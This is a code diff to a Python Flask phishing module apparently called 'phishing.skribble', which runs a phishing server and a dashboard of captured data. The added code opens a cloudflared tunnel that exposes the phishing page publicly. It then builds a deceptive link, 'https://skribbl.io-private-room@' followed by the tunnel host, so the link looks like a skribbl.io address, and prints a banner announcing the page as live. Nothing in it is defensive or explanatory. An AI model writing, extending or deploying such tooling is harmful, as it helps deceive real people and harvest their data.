@@ -1,4 +1,5 @@
 import json, threading, time, os, base64, subprocess, re
+import urllib.request
 from flask import Flask, request, Response
 
 TEMPLATE_DIR = os.path.join(os.path.dirname(__file__), '..', '..', 'templates', 'skribble')
@@ -323,7 +324,7 @@ function poll(){
 document.addEventListener('DOMContentLoaded',function(){
   try{
     map=L.map('map',{attributionControl:false,zoomSnap:0.5,wheelPxPerZoomLevel:120}).setView([20,78],5);
-    L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png',{maxZoom:19,keepBuffer:4,updateWhenZooming:false,updateWhenIdle:true,subdomains:'abcd'}).addTo(map);
+    L.tileLayer('/tiles/{z}/{x}/{y}',{maxZoom:19,keepBuffer:4,updateWhenZooming:false,updateWhenIdle:true}).addTo(map);
     setTimeout(function(){map.invalidateSize();},300);
   }catch(err){console.error('map init failed',err);}
   poll();
@@ -394,6 +395,20 @@ def run(redirect_url: str):
         return Response(lcss, mimetype='text/css',
                         headers={'Cache-Control': 'public, max-age=86400'})
 
+    @dash_app.route('/tiles/<int:z>/<int:x>/<int:y>')
+    def dash_tiles(z, x, y):
+        subdomains = ['a', 'b', 'c', 'd']
+        s = subdomains[(x + y) % 4]
+        url = f'https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}.png'
+        try:
+            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
+            with urllib.request.urlopen(req, timeout=8) as resp:
+                data = resp.read()
+            return Response(data, mimetype='image/png',
+                            headers={'Cache-Control': 'public, max-age=86400'})
+        except Exception:
+            return Response(status=204)
+
     @dash_app.route('/api/captures')
     def api_captures(): return Response(json.dumps(list(captures), default=str), mimetype='application/json')
 
@@ -408,10 +423,49 @@ def run(redirect_url: str):
     threading.Thread(target=lambda: phish_app.run(host='0.0.0.0', port=PHISH_PORT, threaded=True, debug=False, use_reloader=False), daemon=True).start()
     threading.Thread(target=lambda: dash_app.run(host='0.0.0.0', port=DASH_PORT, threaded=True, debug=False, use_reloader=False), daemon=True).start()
 
-    return {
+    time.sleep(2)
+
+    # Start cloudflared tunnel
+    cloudflared = os.path.join(TEMPLATE_DIR, 'cloudflared')
+    cf_log = os.path.join(TEMPLATE_DIR, 'cloudflared.log')
+    tunnel_url = None
+    masked_url = None
+    if os.path.isfile(cloudflared):
+        with open(cf_log, 'w') as f:
+            subprocess.Popen([cloudflared, 'tunnel', '--url', f'http://localhost:{PHISH_PORT}', '--no-autoupdate'],
+                             stdout=f, stderr=f)
+        for _ in range(35):
+            time.sleep(1)
+            try:
+                with open(cf_log) as f:
+                    m = re.search(r'https://[a-z0-9\-]+\.trycloudflare\.com', f.read())
+                    if m:
+                        tunnel_url = m.group(0)
+                        break
+            except Exception:
+                pass
+        if tunnel_url:
+            host = tunnel_url.replace('https://', '')
+            masked_url = f'https://skribbl.io-private-room@{host}'
+
+    result = {
         'module': 'phishing.skribble',
         'phish_port': PHISH_PORT,
         'dash_port': DASH_PORT,
         'redirect_url': redirect_url,
-        'status': 'running'
+        'status': 'running',
+        'tunnel': tunnel_url or 'cloudflared not found',
+        'masked_url': masked_url or 'N/A',
     }
+
+    bar = '═' * 70
+    print(f'\n╔{bar}╗')
+    print(f'║  skribble is LIVE{" " * 52}║')
+    print(f'╠{bar}╣')
+    print(f'║  Plain URL   : {(tunnel_url or "N/A"):<53}║')
+    print(f'║  Masked URL  : {(masked_url or "N/A"):<53}║')
+    print(f'║  Dashboard   : http://localhost:{DASH_PORT:<38}║')
+    print(f'║  Redirects → : {redirect_url:<53}║')
+    print(f'╚{bar}╝')
+
+    return result
